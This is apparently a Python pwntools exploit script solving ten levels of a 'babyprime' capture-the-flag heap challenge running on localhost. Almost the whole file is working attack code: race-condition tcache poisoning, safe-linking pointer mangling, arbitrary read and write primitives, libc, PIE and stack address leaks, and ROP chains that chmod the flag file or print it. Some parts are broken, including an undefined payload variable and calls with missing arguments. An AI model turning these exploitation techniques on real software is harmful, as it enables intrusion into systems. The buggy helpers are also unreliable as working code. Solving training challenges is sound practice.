from pwn import *
import os
import time
import re
import sys

CHALLENGE_NAME = f"/challenge/babyprime_level{os.getenv('HOSTNAME')[-4:-2]}.{os.getenv('HOSTNAME')[-1:]}"
libc = ELF(f"/challenge/lib/libc.so.6")
binary = ELF(CHALLENGE_NAME)

def demangle(ptr, pg_off=0):
    middle = ptr ^ ((ptr >> 12)+pg_off)
    return (middle ^ (middle >> 24))

def mangle(pos, ptr):
    return ((pos >> 12) ^ ptr)

# function to leak pthread address
# which is also a libc address
# which is also a heap arena address
def leak_perthread_addr(r1, r2):
    if os.fork() == 0:
        for _ in range(10000):
            r1.sendline(b'malloc 0 scanf 0 aaaaaaaabbbbbbbb free 0')
        os.kill(os.getpid(), 9)
    for _ in range(10000):
        r2.sendline(b'printf 0')
    os.wait()
    output = r2.clean()

    print(set(output.splitlines()))

    pthread_leak = (int.from_bytes(next(a for a in output.split() if b'\x07\x00\x00' in a)[:8], 'little')) << 12
    return pthread_leak

def arb_read(r1, r2, addr, index):
    while True:
        if os.fork() == 0:
            for _ in range(1000):
                r1.sendline(f'malloc {index} free {index}'.encode())
            sys.exit(0)
        for _ in range(300):
            print_statement = (f'scanf {index} '.encode() + p64(addr) + b' ')
            r2.sendline(print_statement * 100)
        os.wait()

        r1.sendline(f'malloc {index}'.encode())
        r1.sendline(f'printf {index}'.encode())
        r1.readuntil(b'MESSAGE: ')

        result = r1.readline().strip().ljust(8, b'\x00')
        result = result[:8]
        result = u64(result)
        r1.sendline(f'free {index}'.encode())
        r1.clean()
        r2.clean()
        if result == addr:
            break
    r1.sendline(f'malloc {index+1}'.encode())
    r1.sendline(f'malloc {index+2}'.encode())
    r1.sendline(f'printf {index+2}'.encode())
    r1.readuntil(b'MESSAGE: ')
    output = r1.readline().strip()
    r2.sendline(f'free {index+1}'.encode())
    r2.sendline(f'free {index+2}'.encode())
    return output

idx = 1
# reads the 8 bytes found at the pointer 'addr'
def arbitrary_read(r1, r2, addr):
    global idx
    # print(idx)
    r1.clean()
    r2.clean()
    packed = p64(addr)
    # print(idx)
    r1.sendline(f'malloc {idx} malloc {idx+1} malloc 3 free {idx+1}')


    # malloc twice
    # free once
    # free in a loop
    # scanf to overwrite alloc 1 with the address you want
    # malloc into the first address
    # printf the first address 
    # if the output is 
    num = 0
    while True:
        num += 1
        if os.fork() == 0:
            
            r1.sendline(b'free 1')
            os.kill(os.getpid(), 9)
        r2.send((b'scanf %d ' %idx + packed + b"\n")*2000)
        os.wait()
        time.sleep(0.1)
        print(r1.clean().decode())
        input("waiting")
        r1.sendline(f'malloc {idx} printf {idx}')
        r1.readuntil(b'MESSAGE: ')
        stored = r1.readline().strip()
        if stored == packed.split(b'\0')[0]:
            break
    
    r1.sendline(f'malloc {idx+1}')
    r1.clean()
    r1.sendline(f'printf {idx+1}')
    r1.readuntil(b'MESSAGE: ')
    output = r1.readline().strip()
    idx += 2
    return output

# \xc0\x06

# writes 8 bytes to the pointer 'addr'
def arbitrary_write(r1, r2, addr, value, index):
    global idx
    idx = index
    # print(idx)
    r1.clean()
    r2.clean()
    packed = p64(addr)
    print(idx)
    r1.sendline(f'malloc {idx} malloc {idx+1} free {idx+1}')
    num = 0
    while True:
        num += 1
        if os.fork() == 0:
            r1.sendline(f'free {idx}')
            os.kill(os.getpid(), 9)
        r2.send((b'scanf %d ' %idx + packed + b"\n")*2000)
        os.wait()
        time.sleep(0.1)
        r1.sendline(f'malloc {idx} printf {idx}')
        r1.readuntil(b'MESSAGE: ')
        stored = r1.readline().strip()
        if stored == packed.split(b'\0')[0]:
            break
    
    r1.sendline(f'malloc {idx+1}')
    r1.clean()
    r1.sendline(f'scanf {idx+1}'.encode() + value + b'\n')    
    idx += 2


def warm_up(rem):
    rem.sendline(b'malloc 8')
    rem.sendline(b'malloc 9')
    rem.sendline(b'malloc 10')
    rem.sendline(b'free 10')
    rem.sendline(b'free 9')
    rem.sendline(b'free 8')

def get_heap_leak(r1, r2, index):
    r1.clean()
    r2.clean()
    if os.fork() == 0:
        for _ in range(300):
            r1.sendline(f'malloc {index} free {index}'.encode())
        sys.exit(0)
    for _ in range(600):
        r2.sendline(f'printf {index}'.encode())
    os.wait()
    for l in r2.clean().split(b'\n'):
        if b'NONE' not in l:
            return l[9:]

def get_libc_base(r1, r2, index):
    heap_leak = get_heap_leak(r1, r2, index)
    heap_leak = int.from_bytes(heap_leak, "little")
    heap_leak_demangled = demangle(heap_leak, -1)
    print(f'heap leak {hex(heap_leak_demangled)}')
    # calculate where the main arena is, which is in libc
    main_arena = heap_leak_demangled - 0x1340 + 0x8a0
    print(f'main arena at {hex(main_arena)}')
    mangled = mangle(main_arena, main_arena)
    main_arena_addr = arbitrary_read(r1, r2, mangled)
    main_arena_addr = int.from_bytes(main_arena_addr, 'little')
    print(f'main arena addr is {hex(main_arena_addr)}')
    libc_base = main_arena_addr - 0x219c80
    print(f'libc is {hex(libc_base)}')
    return libc_base

def get_pie_base(r3, r4, index, offset1, offset2):
    heap_leak = get_heap_leak(r3, r4, index)
    heap_leak = int.from_bytes(heap_leak, "little")
    heap_leak_demangled = demangle(heap_leak, -1)
    main_arena = heap_leak_demangled - 0x1340 + 0x8a0
    # mangled will be a pie leak location
    # binary_addr = mangle(main_arena, libc.address - 0x3060)
    binary_addr = mangle(main_arena, libc.address - offset1)
    # get the base of the binary
    binary_base = arbitrary_read(r3, r4, binary_addr)
    binary_base = int.from_bytes(binary_base, "little") - offset2
    input(f'binary base is {hex(binary_base)}')
    return binary_base

def get_main_stack_base(r3, r4, index, offset):
    heap_leak = get_heap_leak(r3, r4, index)
    heap_leak = int.from_bytes(heap_leak, "little")
    heap_leak_demangled = demangle(heap_leak, -1)
    main_arena = heap_leak_demangled - 0x1340 + 0x8a0
    # mangled will be a pie leak location
    # binary_addr = mangle(main_arena, libc.address - 0x3060)
    binary_addr = mangle(main_arena, libc.address - offset)
    # get the base of the binary
    binary_base = arbitrary_read(r3, r4, binary_addr)
    binary_base = int.from_bytes(binary_base, "little")
    input(f'main stack is {hex(binary_base)}')
    return binary_base

def arb_read_wrapper(r1, r2, index, loc, bytes=False):
    warm_up(r1)
    warm_up(r2)
    # get a new heap leak for safe linking and stuff
    heap_leak = get_heap_leak(r1, r2, index)
    heap_leak = int.from_bytes(heap_leak, "little")
    heap_leak_demangled = demangle(heap_leak, -1)
    main_arena = heap_leak_demangled - 0x1340 + 0x8a0
    # mangled will be the location of secret
    secret_addr = mangle(main_arena, loc)
    # read from the secret location
    secret = arbitrary_read(r1, r2, secret_addr)
    return secret if bytes else int.from_bytes(secret, 'little')

def arb_write_wrapper(r5, r6, messages, payload, index):
    heap_leak = get_heap_leak(r5, r6, index)
    heap_leak = int.from_bytes(heap_leak, "little")
    heap_leak_demangled = demangle(heap_leak, -1)
    main_arena = heap_leak_demangled - 0x1340 + 0x8a0
    secret_addr = mangle(main_arena, messages)
    arbitrary_write(r5, r6, secret_addr, payload, 7)

# stores a secret in the bss
# use an arbitrary read to read the secret
# use the secret to get authorized to read the flag
def challenge1():
    secret = 0x405480
    p = process([CHALLENGE_NAME], close_fds=False)
    p.clean()
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    leak = leak_perthread_addr(r1, r2)
    secret = arbitrary_read(r1, r2, mangle(leak, secret))
    r3 = remote('localhost', 1337)
    r3.sendline(b'send_flag ' + secret + b" quit")
    info(r3.clean())
    p.kill()

# same as chall 1 but the secret is stored on the heap
# just find the heap offset to win
def challenge2():
    heap_offset = 0xfb0
    p = process([CHALLENGE_NAME], close_fds=False)
    p.clean()
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    leak = leak_perthread_addr(r1, r2)
    secret = arbitrary_read(r1, r2, mangle(leak, leak+heap_offset))
    r3 = remote('localhost', 1337)
    r3.sendline(b'send_flag ' + secret + b" quit")
    info(r3.clean())
    p.kill()

# same as level 1 but you need to get a stack leak
# need to do 2 arbitrary reads for this
def challenge3():
    # start process and get the pid for debugging
    p = process([CHALLENGE_NAME], close_fds=False, level='CRITICAL')
    p.clean()
    input(f'pid = {p.pid}...')
    r1 = remote('localhost', 1337, level='CRITICAL')
    r2 = remote('localhost', 1337, level='CRITICAL')
    input('started 2 threads...')
    # warm up the tcache (add 3 entries for each)
    warm_up(r1)
    warm_up(r2)
    # get a heap leak
    heap_leak = get_heap_leak(r1, r2, 1)
    heap_leak = int.from_bytes(heap_leak, "little")
    heap_leak_demangled = demangle(heap_leak, -1)
    print(hex(heap_leak_demangled))
    # calculate where the main arena is, which is in libc
    main_arena = heap_leak_demangled - 0x1340 + 0x8a0

    mangled = mangle(main_arena, main_arena)
    main_arena_addr = arbitrary_read(r1, r2, mangled)
    main_arena_addr = int.from_bytes(main_arena_addr, 'little')
    # calculate where libc base is
    libc.address = main_arena_addr - 0x219c80
    print(hex(libc.address))
    input('got libc addr...')
    # start 2 more threads and warm them up
    r3 = remote('localhost', 1337, level='CRITICAL')
    r4 = remote('localhost', 1337, level='CRITICAL')
    warm_up(r3)
    warm_up(r4)
    # get a new heap leak for safe linking and stuff
    heap_leak = get_heap_leak(r3, r4, 4)
    heap_leak = int.from_bytes(heap_leak, "little")
    heap_leak_demangled = demangle(heap_leak, -1)
    # 
    main_arena = heap_leak_demangled - 0x1340 + 0x8a0
    # mangled will be the location of secret but mangled
    mangled = mangle(main_arena, libc.address - 0x4770)
    # read from the secret location
    secret = arbitrary_read(r3, r4, mangled)
    # send the secret and profit
    r5 = remote('localhost', 1337)
    r5.sendline(b'send_flag ' + secret + b" quit")
    info(r5.clean())
    p.kill()
    
# same as level 1 but now pie is on
# 1. leak libc
# 2. leak pie address
# 3. leak the secret
def challenge4():
    # start process and get the pid for debugging
    p = process([CHALLENGE_NAME], close_fds=False, level='CRITICAL')
    p.clean()
    input(f'pid = {p.pid}...')
    r1 = remote('localhost', 1337, level='CRITICAL')
    r2 = remote('localhost', 1337, level='CRITICAL')
    input('started 2 threads...')
    # warm up the tcache (add 3 entries for each)
    warm_up(r1)
    warm_up(r2)
    # calculate where libc base is
    libc.address = get_libc_base(r1, r2, 1)
    input('got libc addr...')
    # start 2 more threads and warm them up
    r3 = remote('localhost', 1337, level='CRITICAL')
    r4 = remote('localhost', 1337, level='CRITICAL')
    warm_up(r3)
    warm_up(r4)
    pie_base = get_pie_base(r3, r4, 3, 0x4620)
    # start 2 more threads
    r5 = remote('localhost', 1337, level='CRITICAL')
    r6 = remote('localhost', 1337, level='CRITICAL')
    warm_up(r5)
    warm_up(r6)
    # get a new heap leak for safe linking and stuff
    heap_leak = get_heap_leak(r5, r6, 6)
    heap_leak = int.from_bytes(heap_leak, "little")
    heap_leak_demangled = demangle(heap_leak, -1)
    main_arena = heap_leak_demangled - 0x1340 + 0x8a0
    # mangled will be the location of secret
    secret_addr = mangle(main_arena, pie_base + 0x5370)
    # read from the secret location
    secret = arbitrary_read(r5, r6, secret_addr)
    print(secret)
    # send the secret and profit
    r7 = remote('localhost', 1337)
    r7.sendline(b'send_flag ' + secret + b" quit")
    info(r7.clean())
    p.kill()

# the secret is on the main stack
# just find a main stack value from thread 2
# then print the secret from there
def challenge5():
    # start process and get the pid for debugging
    p = process([CHALLENGE_NAME], close_fds=False, level='CRITICAL')
    p.clean()
    input(f'pid = {p.pid}...')
    r1 = remote('localhost', 1337, level='CRITICAL')
    r2 = remote('localhost', 1337, level='CRITICAL')
    input('started 2 threads...')
    # warm up the tcache (add 3 entries for each)
    warm_up(r1)
    warm_up(r2)
    # calculate where libc base is
    libc.address = get_libc_base(r1, r2, 1)
    # print(hex(libc.address + 0x5309e79b10))
    input('got libc addr...')
    # start 2 more threads and warm them up
    r3 = remote('localhost', 1337, level='CRITICAL')
    r4 = remote('localhost', 1337, level='CRITICAL')
    warm_up(r3)
    warm_up(r4)
    main_stack = get_main_stack_base(r3, r4, 3, 0x4620)
    # start 2 more threads
    r5 = remote('localhost', 1337, level='CRITICAL')
    r6 = remote('localhost', 1337, level='CRITICAL')
    warm_up(r5)
    warm_up(r6)
    # get a new heap leak for safe linking and stuff
    heap_leak = get_heap_leak(r5, r6, 6)
    heap_leak = int.from_bytes(heap_leak, "little")
    heap_leak_demangled = demangle(heap_leak, -1)
    main_arena = heap_leak_demangled - 0x1340 + 0x8a0
    # mangled will be the location of secret
    secret_addr = mangle(main_arena, main_stack - 0x128)
    # read from the secret location
    secret = arbitrary_read(r5, r6, secret_addr)
    print(secret)
    # send the secret and profit
    for i in range(97, 123):
        r7 = remote('localhost', 1337)
        bf = chr(i).encode()
        bf_secret = bf + secret
        print(bf_secret)
        r7.sendline(b'send_flag '+ bf_secret + b" quit")
        output = r7.clean()
        r7.close()
        if b'pwn' in output:
            print(output)
            break
    p.kill()

# secret is stored on the main stack
# need to leak the main stack
# then leak the heap address
# then leak the secret
def challenge6():
    # start process and get the pid for debugging
    p = process([CHALLENGE_NAME], close_fds=False, level='CRITICAL')
    p.clean()
    input(f'pid = {p.pid}...')
    r1 = remote('localhost', 1337, level='CRITICAL')
    r2 = remote('localhost', 1337, level='CRITICAL')
    input('started 2 threads...')
    # warm up the tcache (add 3 entries for each)
    warm_up(r1)
    warm_up(r2)
    # calculate where libc base is
    libc.address = get_libc_base(r1, r2, 1)
    # print(hex(libc.address + 0x5309e79b10))
    input('got libc addr...')
    # start 2 more threads and warm them up
    r3 = remote('localhost', 1337, level='CRITICAL')
    r4 = remote('localhost', 1337, level='CRITICAL')
    warm_up(r3)
    warm_up(r4)
    heap_secret_ptr = get_main_stack_base(r3, r4, 3, 0x4620) - 0x148
    
    # start 2 more threads
    r5 = remote('localhost', 1337, level='CRITICAL')
    r6 = remote('localhost', 1337, level='CRITICAL')
    secret_addr = arb_read_wrapper(r5, r6, 6, heap_secret_ptr)
    input(f'heap leak = {hex(secret_addr)}')
    r7 = remote('localhost', 1337, level='CRITICAL')
    r8 = remote('localhost', 1337, level='CRITICAL')
    secret = arb_read_wrapper(r7, r8, 8, secret_addr, bytes=True)
    print(secret)
    # send the secret and profit
    r7 = remote('localhost', 1337)
    r7.sendline(b'send_flag '+ secret + b" quit")
    print(r7.clean())
    p.kill()

def start_connections():
    r3 = remote('localhost', 1337, level='CRITICAL')
    r4 = remote('localhost', 1337, level='CRITICAL')
    warm_up(r3)
    warm_up(r4)
    return r3, r4

# first level with an arb write
# just need to rop
def challenge7():
    # start process and get the pid for debugging
    p = process([CHALLENGE_NAME], close_fds=False, level='CRITICAL')
    p.clean()

    input(f'pid = {p.pid} ...')
    r1, r2 = start_connections()
    
    input('started 2 threads...')
    # warm up the tcache (add 3 entries for each)
    # calculate where libc base is
    libc.address = get_libc_base(r1, r2, 1)

    # print(hex(libc.address + 0x5309e79b10))
    input('got libc addr...')
    # start 2 more threads and warm them up
    r3, r4 = start_connections()
    pie_base = get_pie_base(r3, r4, 3, 0x3060, 0x1b91)
    messages = pie_base + 0x4060
    print(hex(messages))
    t4_rip = libc.address - 0x1807208
    input(f'thread 5 rip = {hex(t4_rip)}')


    # r0 = remote('localhost', 1337)

    # r0.sendline(b'malloc 0')
    # r0.sendline(b'quit')


    r5, r6 = start_connections()
    heap_leak = get_heap_leak(r5, r6, 6)
    heap_leak = int.from_bytes(heap_leak, "little")
    heap_leak_demangled = demangle(heap_leak, -1)
    main_arena = heap_leak_demangled - 0x1340 + 0x8a0
    # mangled will be the location of secret
    stored = pie_base + 0x40e0
    print(f'stored {hex(stored)}')
    secret_addr = mangle(main_arena, messages)
    payload = p64(t4_rip) + (p64(0x00)*15) + p32(0x1) + p32(0x1) + (p64(0x00)*7) 
    arbitrary_write(r5, r6, secret_addr, payload, 7)
    
    input('did the write 0')
    # arbitrary_write(r5, r6, secret_addr, 0x2, 9)

    # input('did the write 1')

    # r7, r8 = start_connections()
    # heap_leak = get_heap_leak(r7, r8, 11)

    



    r7 = remote('localhost', 1337)

    rop = ROP(libc, badchars=b'\x09\x0a\x0b\x0c\x0d\x0e\x20')
    pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
    pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
    pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
    syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
    trash_string = p64(next(libc.search(b'libc_intl_domainname')))
    rop_chain = pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x1ff)+syscall


    # challenge+588
    # print(len(rop.chain()))

    r7.sendline(b'scanf 0 ' + rop_chain)
    info(r7.clean())

    input('waiting...')

    r4.sendline(b'quit')
    print(r4.clean())

    p.kill()

# same as level 7 but the program calls exit() instead of returning
def challenge8():
    # start process and get the pid for debugging
    p = process([CHALLENGE_NAME], close_fds=False, level='CRITICAL')
    p.clean()
    input(f'pid = {p.pid} ...')
    # calculate where libc base is
    r1, r2 = start_connections()
    libc.address = get_libc_base(r1, r2, 1)
    input('check libc')
    # make a ropchain for chmod('/flag', 0777)
    rop = ROP(libc, badchars=b'\x09\x0a\x0b\x0c\x0d\x0e\x20')
    pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
    pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
    pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
    syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
    trash_string = p64(next(libc.search(b'libc_intl_domainname')))
    rop_chain = pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x1ff)+syscall
    input('got libc addr...')
    # get the base address of the binary
    r3, r4 = start_connections()
    binary.address = get_pie_base(r3, r4, 3, 0x3060, 0x1ba2)
    messages = binary.address + 0x4060
    # this rip is the return address of fscanf not from challenge
    # since challenge does not return but calls exit()
    t4_rip = libc.address - 0x1807748
    print(f'messages is at {hex(messages)}')
    input(f'thread 5 rip is at {hex(t4_rip)}')
    # write messages[0] with the address of r4's rip
    r5, r6 = start_connections()
    
    arb_write_wrapper(r5, r6, messages, payload, 6)
    input('did the write 0')
    # scanf the ropchain into the rip location
    r7 = remote('localhost', 1337)
    r7.sendline(b'scanf 0 ' + rop_chain)
    info(r7.clean())
    input('waiting...')
    # send input to make r4 return from fscanf
    r4.sendline(b'quit')
    print(r4.clean())
    # 1110
    p.kill()
    # 0x7fb2798da9b8
    

# does a bunch of random allocations 
# need to malloc one extra time for the read to work
def challenge9():
    # start process and get the pid for debugging
    p = process([CHALLENGE_NAME], close_fds=False, level='CRITICAL')
    p.clean()
    input(f'pid = {p.pid} ...')
    r1 = remote('localhost', 1337, level='CRITICAL')
    r2 = remote('localhost', 1337, level='CRITICAL')
    input('waiting')
    # get a heap leak from thread 3
    if os.fork() == 0:
        for _ in range(10000):
            r1.sendline(b'malloc 0 free 0')
        os.kill(os.getpid(), 9)
    for _ in range(10000):
        r2.sendline(b'printf 0')

    os.wait() 
    output = r2.clean()
    # print(set(output.splitlines()))
    try:
        pthread_leak = (int.from_bytes(next(a for a in output.split() if b'\x07' in a)[:8], 'little')) << 12
    except Exception:
        print('no leak found...')
        sys.exit(0)
    print(hex(pthread_leak))
    input('waiting')
    secret_ptr = pthread_leak + 0x13c0

    # read from the secret ptr
    print(f'secret is at {hex(secret_ptr)}')
    r1.clean()
    r2.clean()
    packed = p64(mangle(pthread_leak, secret_ptr))
    idx = 1
    # need the extra malloc here
    r1.sendline(b'malloc 1 malloc 2 malloc 3 free 2')
    while True:
        if os.fork() == 0:
            r1.sendline(b'free 1')
            os.kill(os.getpid(), 9)
        r2.send((b'scanf %d ' %idx + packed + b"\n")*2000)
        os.wait()
        time.sleep(0.1)
        r1.sendline(f'malloc {idx} printf {idx}')
        r1.readuntil(b'MESSAGE: ')
        stored = r1.readline().strip()
        if stored == packed.split(b'\0')[0]:
            break
    r1.sendline(f'malloc {idx+1}')
    r1.clean()
    r1.sendline(f'printf {idx+1}')
    r1.readuntil(b'MESSAGE: ')
    output = r1.readline().strip()
    # get the flag
    r3 = remote('localhost', 1337)
    r3.sendline(b'send_flag ' + output)
    info(r3.clean())
    p.kill()

def make_conn10():
    r1 = remote('localhost', 1337, level='CRITICAL')
    r2 = remote('localhost', 1337, level='CRITICAL')
    r3 = remote('localhost', 1337, level='CRITICAL')
    return (r1, r2, r3)

def get_heap_start10(r1, r2):
    for i in range(10000):
        r1.sendline(b'malloc 0 printf 0') 
        r2.sendline(b'free 0')
        output = r1.clean()
        r2.clean()
        if(b'\x7f' in output):
            break  
    leak = int.from_bytes(output[-7:].strip(), 'little')
    heap_leak = demangle(leak, pg_off=-1) 
    heap_leak &= 0xffffff000000
    return heap_leak

def get_mangle_ptr10(r1, r2):
    r1.sendline(b'malloc 2')
    for i in range(10000):
        r1.sendline(b'malloc 1 free 1')
        r2.sendline(b'printf 1')
        output = r2.clean()
        r2clean = r2.clean()
        if(b'\x07' in output):
            # print(output)
            break
    leak = int.from_bytes(output[-7:].strip(), 'little') << 12
    return leak

def arb_read10(r1, r3, packed):
    r1.sendline(b'malloc 1 malloc 2')
    time.sleep(0.1)
    r1.sendline(b'free 2')
    while True:
        if os.fork() == 0:
            r1.sendline(b'free 1')
            os.kill(os.getpid(), 9)
        r3.send((b'scanf 1 ' + packed + b'\n')* 2000)
        os.wait()
        r1.sendline(b'malloc 1 printf 1')
        output = r1.clean()
        if packed[:-2] in output:
            break
    r1.sendline(b'malloc 2')
    r1.sendline(b'printf 2')
    r1.readuntil(b'MESSAGE: ')
    leak = int.from_bytes(r1.readline().strip(), 'little')# - 0x219c80
    return leak

def get_libc_base10(r1, r2, r3):
    time.sleep(0.1)
    r1_heap_start = get_heap_start10(r1, r2)
    input(f'thread 2 heap starts at {hex(r1_heap_start)}')
    time.sleep(0.1)
    mangle_ptr = get_mangle_ptr10(r1, r2)
    input(f'mangle ptr is {hex(mangle_ptr)}')
    print_me = r1_heap_start + (0x8a0)
    mangled = mangle(mangle_ptr, print_me)
    packed = p64(mangled)
    libc_base = arb_read10(r1, r3, packed) - 0x219c80
    input(f'libc base at {hex(libc_base)}')
    return libc_base, r1_heap_start


# for when you come back
# 1. i can leak a heap address
# 2. when i do an arb read there is one byte of randomness I cannot account for
def challenge10():
    # start process and get the pid for debugging
    p = process([CHALLENGE_NAME], close_fds=False, level='CRITICAL')
    p.clean()
    input(f'pid = {p.pid} ...')
    r1, r2, r3 = make_conn10()
    print(r1.clean())
    r1_end = r1
    input('waiting')
    # get the address of libc
    libc.address, r1_old_heap_start = get_libc_base10(r1, r2, r3)
    # get the address of main using the address of libc
    r1, r2, r3 = make_conn10()
    r1_heap_start = get_heap_start10(r1, r2)
    input(f'thread 2 heap starts at {hex(r1_heap_start)}')
    time.sleep(0.1)
    mangle_ptr = get_mangle_ptr10(r1, r2)
    input(f'mangle ptr is {hex(mangle_ptr)}')
    print_me = libc.address - 0x3060
    mangled = mangle(mangle_ptr, print_me)
    packed = p64(mangled)
    r1.sendline(b'malloc 1 malloc 3')
    input("waiting")
    time.sleep(0.1)
    r1.sendline(b'free 3')
    while True:
        if os.fork() == 0:
            r1.sendline(b'free 1')
            os.kill(os.getpid(), 9)
        r3.send((b'scanf 1 ' + packed + b'\n')* 2000)
        os.wait()
        r1.sendline(b'malloc 1 printf 1')
        output = r1.clean()
        if packed[:-2] in output:
            break
    input('gdb')    
    r1.sendline(b'malloc 3')
    r1.sendline(b'printf 3')
    r1.readuntil(b'MESSAGE: ')
    # got main 
    main = int.from_bytes(r1.readline().strip(), 'little')
    binary.address = main - binary.symbols['main']
    input(f'binary base is at {hex(binary.address)}')
    # write to the messages location so that
    # when thread 2 returns from fscanf it will call the ropchain
    r1, r2, r3 = make_conn10()
    r1_heap_start = get_heap_start10(r1, r2)
    input(f'thread 2 heap starts at {hex(r1_heap_start)}')
    time.sleep(0.1)
    mangle_ptr = get_mangle_ptr10(r1, r2)
    input(f'mangle ptr is {hex(mangle_ptr)}')
    print_me = binary.address + 0x5220
    mangled = mangle(mangle_ptr, print_me)
    packed = p64(mangled)
    r1.sendline(b'malloc 1 malloc 4')
    input("waiting")
    time.sleep(0.1)
    r1.sendline(b'free 4')
    while True:
        if os.fork() == 0:
            r1.sendline(b'free 1')
            os.kill(os.getpid(), 9)
        r3.send((b'scanf 1 ' + packed + b'\n')* 2000)
        os.wait()
        r1.sendline(b'malloc 1 printf 1')
        output = r1.clean()
        if packed[:-2] in output:
            break
    input('gdb')
    t4_rip = libc.address - 0x4648
    print(f't4 rip is at {hex(t4_rip)}')   
    payload = p64(t4_rip) + (p64(0x00)*15) + p32(0x1) + p32(0x1) + (p64(0x00)*7) 
    r1.sendline(b'malloc 4')
    r1.sendline(b'scanf 4 ' + payload)
    input("did the write 0")
    # make a ropchain to puts the flag that is in memory
    rop = ROP(libc, badchars=b'\x09\x0a\x0b\x0c\x0d\x0e\x20')
    print(f'flag at {hex(r1_old_heap_start+0x1110)}')
    rop.call('puts', [r1_old_heap_start+0x1110])
    rop.call('exit', [42])
    r7 = remote('localhost', 1337)
    r7.sendline(b'scanf 0 ' + rop.chain())
    input("waiting")
    r1_end.sendline(b'quit')
    print(r1_end.clean())
    input("waiting")
    p.wait()
    print(p.clean())
    print(p.poll(block=True))
    p.kill()


def main():
    context.arch = 'amd64'
    context.encoding ='latin'
    context.log_level = 'INFO'
    context.terminal = ["tmux", "splitw", "-h"]
    warnings.simplefilter('ignore')
    challenge10()


if __name__ == "__main__":
    main()


    

# with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *main+693
    # b *main+432
    # ''') as p:
    

# core = Coredump('./core')
# print(core)


    